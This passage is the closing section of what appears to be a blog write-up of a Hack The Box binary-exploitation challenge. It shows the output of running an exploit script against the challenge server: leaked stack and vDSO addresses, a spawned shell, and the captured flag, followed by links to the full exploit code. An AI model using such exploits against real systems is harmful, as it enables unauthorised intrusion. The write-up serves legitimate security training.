<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">()</span>
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>With this, we have a shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 94.237.62.195:51865
[<span class="code-blue">*</span>] './challenge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-red">No RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
[<span class="code-green">+</span>] Opening connection to 94.237.62.195 on port 51865: Done
[<span class="code-blue">*</span>] Stack address: 0x7fff130e7000
[<span class="code-green">+</span>] vDSO address: 0x7fff131c0000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
b27c2d79500a865cf20824a398a05ff1f0a58a36a4da0f3ab906d0e9b65b7593.txt  
bin
challenge
dev
etc
home
init
lib
lib64
linuxrc
media
mnt
opt
proc
root
run
sbin
sys
tmp
usr
var
[<span class="code-blue">*</span>] Got EOF while reading in interactive
<span class="code-red">$</span>
</code></pre></div><p>For some reason, the server blocks once we execute a command, but that&rsquo;s not a problem.</p><h2 id="flag">Flag</h2><p>This is the flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 94.237.62.195:51865
[<span class="code-blue">*</span>] './challenge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-red">No RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
[<span class="code-green">+</span>] Opening connection to 94.237.62.195 on port 51865: Done  
[<span class="code-blue">*</span>] Stack address: 0x7ffed779c000
[<span class="code-green">+</span>] vDSO address: 0x7ffed77d3000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> cat *.txt
HTB{th4re_is_a1ways_a_vDS0_2_go_2!!}
[<span class="code-blue">*</span>] Got EOF while reading in interactive
<span class="code-red">$</span>
</code></pre></div><p>The full exploit code is <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/Nowhere%20to%20go/solve.py"><code>solve.py</code></a>, and the other script is <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/Nowhere%20to%20go/dump.py"><code>dump.py</code></a></p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#disassembly">Disassembly</a></li><li><a href="#seccomp-rules"><code>seccomp</code> rules</a></li><li><a href="#buffer-overflow-vulnerability">Buffer Overflow vulnerability</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a><ul><li><a href="#vdso-region">vDSO region</a></li></ul></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#dumping-vdso">Dumping vDSO</a></li><li><a href="#rop-chain">ROP chain</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>